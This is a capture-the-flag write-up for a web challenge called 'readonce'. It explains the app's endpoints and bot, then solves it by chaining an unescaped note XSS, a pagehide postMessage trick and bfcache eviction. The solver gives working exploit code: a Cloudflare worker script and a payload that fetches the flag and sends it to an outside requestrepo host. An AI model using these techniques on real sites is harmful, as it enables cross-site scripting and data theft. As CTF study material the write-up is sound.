# readonce

# Challenge Architecture


Let's first talk about what we have in this challenge:

`/create`:

This endpoint u can use to create new notes with 128 chars body. After creating a note, it will create a note id then you will be redirected to the `/note/:id` endpoint, where you can see the note you just created.

`/note/:id`:

Will render your note with a strict CSP, and the renderer file also has `<%= note.html %>` so it escapes any HTML tags you are trying to inject.

`/report`:

Takes the attacker URL and a note ID from it, then creates a `currentReview` object with some properties; each one has its own job:

1. **id**: random report identifier. The bot appends it as `rid` to the attacker URL: `rid=<REPORT_ID>`. It identifies which active review later routes belong to.

2. **url**: the submitted attacker URL. The bot eventually navigates to it.

3. **noteId**: extracted from `?note=<id>` in the submitted URL. This selects the player’s stored note that `/reports/check` will render after all checks pass.

4. **prepared**: starts false; `/reports/arm/:id` sets it to true after the bot finishes its startups, indicating that the bot is ready to start the review process.

5. **approved**: starts false; `/complete` sets it to true if a request is made to it successfully.

6. **used**: starts false; set to true when `/reports/check` successfully serves the note. It makes the capability one-time use.

7. **visited**: starts false; the first bot visit to `/reports/check` sets it to true and returns the harmless page. Later requests render the note instead if `visited` is already true.

8. **nonce**: a random per-review value. `/review` includes it in the internal `/complete` request, and the server verifies it. It binds the approval action to this specific active review.

9. **flag**: starts null; `/api/flag` initializes it with FLAG during the bot setup process.

`/reports/session`:

Bot session setup. bot opens this route with `X-Bot-Token` and the server sets:

```js
req.session.name = "reviewer";
req.session.admin = true;
```

`/reports/arm/:id`:

This is a bot-only endpoint. After the bot opens `/reports/check`, the bot code calls this route with `X-Bot-Token` to set: `currentReview.prepared = true`. indicates the bot is ready to start the review process.

`/reports/check?rid=<id>`:

This is the central route. This is where all the important things happen. On the first load, it:
- requires the reviewer session, checks if it's admin or not;
- gets the report ID and verifies if it's the same ID in the `currentReview` object or not;
- sets `currentReview.visited = true` and returns a harmless "Opening document" page;
- If `currentReview.visited` is already true and the request passes `policy()` and `consumeReport()`, `review-document.ejs` will be rendered, which will render your note body unescaped `<%- note.html %>` without any CSP.
- sets `Vary: Cookie` header;

You can see we have an XSS here, but we need to pass `policy()` and `consumeReport()` to trigger it, which we will discuss in a sec.

`/review?rid=<id>&u=<url>`:

The `/review` endpoint first checks the `rid` parameter and sees if it matches the `currentReview.id` (the current report ID) or not. It takes a `u` parameter (an attacker URL) and attaches the current `rid` to it, for example: `/review?rid=abc&u=https://attacker.com/frame.js` will be `https://attacker.com/frame.js?rid=abc`.
It creates another property (object) called `document` in the `currentReview` object and attaches a URL property to it with the u parameter it has and a nonce property. 

> [!NOTE] Notice
> this nonce in the `document` property is different from the `currentReview.nonce` property that is used in the `/complete` later on. This nonce will be used as a CSP at `/sandbox` and in the sandbox’s external `<script>` tag.


It sets a strict CSP and allows the page to frame `/sandbox`. Lastly, it renders the `review` page with the report ID `currentReview.id` and the state nonce `currentReview.nonce`.

`/sandbox`:

has a strict CSP and renders an external attacker script with the nonce and URL from `currentReview.document` property. If it does see `?end` parameter, it will render an empty page.

`/review`:

The page has a sandboxed iframe to the `/sandbox` endpoint with the current report id and it allows scripts. After that, it listens for a message and checks if that message comes from the iframe or it comes before the iframe is loaded, it will reject it; otherwise, it will send a post request to `/complete` with the current report ID and the `currentReview.nonce` property.
When the iframe is loaded, it will be redirected to `/sandbox?rid=<id>&end`.

`/complete`:

This route takes the ID and state (nonce) from the request made from the sandboxed iframe on the `/review` page, and it checks them with the current ID and nonce from the `currentReview` object, besides the `.prepared` and `req.session.admin` checks. If all of them pass, it will set `currentReview.approved` to true.

# bot flow
Now we have a good understanding of the challenge and how it works; let's see what the bot does:
```js
context = await browser.createBrowserContext();

const sessionPage = await context.newPage();
await sessionPage.setExtraHTTPHeaders({ "X-Bot-Token": BOT_TOKEN });
const sessionResponse = await sessionPage.goto(`${APP_URL}/reports/session`, {
    waitUntil: "domcontentloaded",
    timeout: 7000,
});
await sessionPage.close();
```
You can see we first create a browser context, then open a page from it; this page will simply be used to hand an admin session to the bot, then closed. Then a new page is opened in the same context:
```js
    const page = await context.newPage();

    await page.goto(`${APP_URL}/reports/check?rid=${encodeURIComponent(report.id)}&state=${encodeURIComponent(report.nonce)}`, {
      waitUntil: "domcontentloaded",
      timeout: 7000,
    });

    await page.goto(`${APP_URL}/api/flag`, {
      waitUntil: "domcontentloaded",
      timeout: 7000,
    });

    const armResponse = await fetch(`${APP_URL}/reports/arm/${encodeURIComponent(report.id)}`, {
      method: "POST",
      headers: { "X-Bot-Token": BOT_TOKEN },
    });

    if (!armResponse.ok) {
      throw new Error(`report arm returned ${armResponse.status}`);
    }

    const url = new URL(report.url);
    url.searchParams.set("rid", report.id);

    await page.goto(url.href, {
      waitUntil: "domcontentloaded",
      timeout: 7000,
    });

    await sleep(10000);
    await page.close();
   finally {
    if (context) {
      await context.close();
    }
    if (browser) {
      await browser.close();
    }
  }
```
The page first visits `/reports/check` with the report ID and nonce (this `report` object is the same `currentReview` object) from the `currentReview` object that was created when you send a post request to `/report`. Then it goes to `/api/flag` to attach the flag. After that, it calls `/reports/arm/:id` to set `.prepared` to true, then it navigates to the attacker URL with the report ID attached to it. All that happens in the **same page**.

# solve, passing `consumeReport()`
So far we know how things work. The only way to get the flag is through the XSS at `/reports/check` when it renders `review-document` page that has no sanitization. To render this page, we need to pass `policy()` and `consumeReport()` checks. Lets start with `consumeReport()` first:
```js
function consumeReport(req) {
  const id = String(req.query.rid || "");
  const state = String(req.query.state || "");

  if (
    !currentReview
    || currentReview.id !== id
    || state !== currentReview.nonce
    || !currentReview.prepared
    || !currentReview.approved
    || currentReview.used
  ) {
    return false;
  }

  currentReview.used = true;
  return true;
}
```
The function takes the nonce from the URL when the bot visits:
```js
page.goto(`${APP_URL}/reports/check?rid=${encodeURIComponent(report.id)}&state=${encodeURIComponent(report.nonce)}`)
```
and check if it matches `currentReview.nonce`. Then it checks if `currentReview.approved` is true or not; this is the important part. The nonce is already done by the bot side, but to get `currentReview.approved` to be true, we need to find out how to do that.

As we said before, `currentReview.approved` is set to true at `/complete` endpoint. A `/complete` request is made at the `/review` page if it receives a message that is not from the sandboxed iframe and the iframe is already loaded. How is that possible? How can we send a message from another window, but we only have access to that iframe window?

There is a well-known trick where you can turn the source of the message to [null](https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation#event.source-null). For this to work, you need to create an iframe, send a message, then delete the iframe immediately. This won't work here cause of two reasons:
1. The trick requires sending the message and deleting the iframe immediately at the same time; this won't work with our check `if (!closing || e.source === viewer.contentWindow) return;`. The iframe needs to be loaded first so `closing` is true. Once the iframe is loaded, it redirects itself to another document, so the script that u had in the old document will be discarded.
2. There is a strict CSP at the iframe `/sandbox` with a `trusted-types 'none'` directive to prevent using some DOM injection sinks such as creating HTML through `innerHTML`, `document.write`, or `iframe.srcdoc`.

The trick here was to use `pagehide` handler, which, for some reason fires when the iframe is deleted or navigated away: https://github.com/whatwg/html/issues/10194

You can also use the `unload` handler, but as of the time I am writing this writeup, it will be deprecated soon: https://developer.chrome.com/docs/web-platform/deprecating-unload
# passing `policy()`
The second check to pass is `policy()`:
```js
function policy(req) {
  return Object.entries({
    "sec-fetch-site": "none",
    "sec-fetch-dest": "document",
  })
    .every(([header, expected]) => req.get(header) === expected);
}
```
The function passes when it finds those two headers with their expected values. The [sec-fetch-site](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site) header is like a relationship between a request initiator's origin and the origin of the requested resource. So we can know whether the initiator who initiated the request and the destination are same-origin or same-site, etc., from [this](https://source.chromium.org/chromium/chromium/src/+/main:services/network/sec_header_helpers.cc;l=104-116?q=sec_header_helpers.cc&ss=chromium%2Fchromium%2Fsrc); you can see `none` should correspond to no initiator. [sec-fetch-dest](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Dest) just means how the fetched data is presented; here it's an HTML document. So we need a way to make a request to `/reports/check` without an initiator.

If you noticed at the very beginning, we said that the bot visits `/reports/check`, `api/flag` to set the flag, `reports/arm/:id` to set `.prepared` to true, then navigates to the attacker URL, and all that happens in the same page. When the bot first visits `/reports/check` it visits it with no initiator cause `page.goto("/reports/check...")` is a fresh top-level navigation in a new page, so Chromium gives it a null initiator; the `sec-fetch-site` will be `none`. We need to go back again to `/reports/check`; we can do that with `history.back()` which is like pressing the back button, so we can go back again to `reports/check`. you might read [this](https://m0z.ie/research/2025-12-19-Seccon-CTF-2025-Writeups-Web/#initiator-null) to understand the initiator thing more.

If you did this, you will be in [bfcache](https://developer.mozilla.org/en-US/docs/Glossary/bfcache), which will not really make a network request to the server to pass the check; we need to evict it. bfcache can hold only [6 navigations](https://source.chromium.org/chromium/chromium/src/+/main:content/browser/back_forward_cache/back_forward_cache_impl.cc;l=78-80?q=back_forward_cache_impl.cc&ss=chromium%2Fchromium%2Fsrc) per tab, so when you overflow that, you can evict it. This was used many times [before](https://book.jorianwoltjer.com/web/client-side/caching#back-forward-bfcache).

After evicting bfcache and going back to `reports/check`, this endpoint has no cache headers, so the browser may cache it again under [Heuristic caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching#heuristic_caching) and you will get the page without making a network request. That's why a `Vary: Cookie` header exists.

When the bot first visits `/reports/check`, it will visit it with the `sid` cookie that it got from the setup process, then `/reports/check` will hand it another cookie, `view`. When we evict the bfcache and go back to `/reports/check`, the endpoint will see two cookies instead of one like before; this no longer matches the cached variant, so Chromium sends a request to Express. It will make a request to the server, and here we can pass the check.

## solver

1. First, host this on requestrepo `fetch('/api/flag').then(r=>r.json()).then(d=>fetch('http://...requestrepo.com/?f='+encodeURIComponent(d.flag)))`. Make sure the content-type is javascript not html

2. create a note `<script src="https://....requestrepo.com/x.js"></script>`

Host the solve on Cloudflare using `wrangler deploy`
```js
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const origin = url.origin;

    if (url.pathname === "/sandbox.js") {
      return javascript(`onpagehide = () => parent.postMessage("done", "*")`);
    }

    if (url.pathname === "/finish") {
      return html(`
        <!doctype html>
        <script>
          setTimeout(() => history.go(-9), 700)
        </script>
      `);
    }

    if (url.pathname.startsWith("/h/")) {
      const i = Number(url.pathname.split("/").pop());
      const next = i < 6 ? `${origin}/h/${i + 1}` : `${origin}/finish`;

      return html(`
        <!doctype html>
        <script>
          setTimeout(() => location = ${JSON.stringify(next)}, 250)
        </script>
      `);
    }

    if (url.pathname === "/start") {
      const target = url.searchParams.get("target");
      const rid = url.searchParams.get("rid");

      if (!target || !rid) {
        return new Response("missing target or rid", { status: 400 });
      }

      const review =
        `${target}/review?rid=${encodeURIComponent(rid)}` +
        `&u=${encodeURIComponent(`${origin}/sandbox.js`)}`;

      return html(`
        <!doctype html>
        <script>
          open(${JSON.stringify(review)}, "review");
          setTimeout(() => location = ${JSON.stringify(`${origin}/h/1`)}, 1200);
        </script>
      `);
    }

    return new Response("not found", { status: 404 });
  },
};

function html(body) {
  return new Response(body, {
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
    },
  });
}

function javascript(body) {
  return new Response(body, {
    headers: {
      "Content-Type": "text/javascript; charset=utf-8",
      "Cache-Control": "no-store",
    },
  });
}

```
4. send it to the bot `https://<....>.workers.dev/start?target=http://localhost:3000&note=<note-id>`
